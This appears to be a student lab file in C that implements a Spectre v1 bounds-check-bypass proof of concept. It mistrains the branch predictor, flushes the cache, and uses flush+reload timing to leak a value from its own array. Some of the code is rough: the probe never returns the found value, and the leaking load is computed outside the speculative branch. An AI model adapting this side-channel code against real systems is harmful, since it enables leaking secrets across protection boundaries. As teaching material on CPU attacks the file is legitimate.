#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)
#define L1_SIZE 32768

#define OFFSET 256 // Some arbitrary offset which ensures that we don't collide with initialization sets
#define STRIDE 153 // Some prime number >100 to avoid thrashing when we measure
#define SECRET 47 // The secret number and index we are looking for

void flush_cache(void *huge_page) {
	for (int i=0; i<100; i++){
		clflush((void *)((uint8_t *)huge_page + STRIDE*i + OFFSET));
	}
}

int probe(void *huge_page) {
	int times[100] = {0};
	for (int i=0; i<100; i++) {
		times[i] = measure_one_block_access_time((uint64_t)((uint8_t *)huge_page + STRIDE*i + OFFSET));
	}
	int secret = 0;
	for (int i=0; i<100; i++) {
		printf("load_time(%d): %d", i, times[i]);
		if (times[i] < 50) {
			printf(" - SECRET VALUE!");
		}
		printf("\n");
	}
	return secret;
}

//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
static uint8_t bounds_check = 20;  
uint8_t victim(void *huge_page, int index) {
	// Assume the first 100 values of the hugepage are allocated as the secret array
	uint8_t *secret_array = (uint8_t *)huge_page;
	int secondary_index = STRIDE*secret_array[index] + OFFSET;
	clflush(&bounds_check);

	if (index <= bounds_check) {
		uint8_t v = secret_array[secondary_index];
	}
	return 0;
}

int main(int argc, char **argv)
{
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation
	flush_cache(huge_page);

    //** STEP 1: Allocate an array into the mmap */
    uint8_t *secret_array = (uint8_t *)huge_page;

    // Initialize the array
    for (int i = 0; i < 100; i++) {
        secret_array[i] = i;
    }

    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times
	// int num_train = rand() % 20 + 20;
	for (int i=0; i<30; i++) {
		int index = rand() % 10 + 10;
		victim(huge_page, index);
	}

    //** STEP 3: Clear cache using clflsuh from utility.h */
	flush_cache(huge_page);

    //** STEP 4: Call victim function again with bounds bypass value */
	victim(huge_page, SECRET);

    //** STEP 5: Reload mmap to see load times */
	probe(huge_page);
    return 0;
}

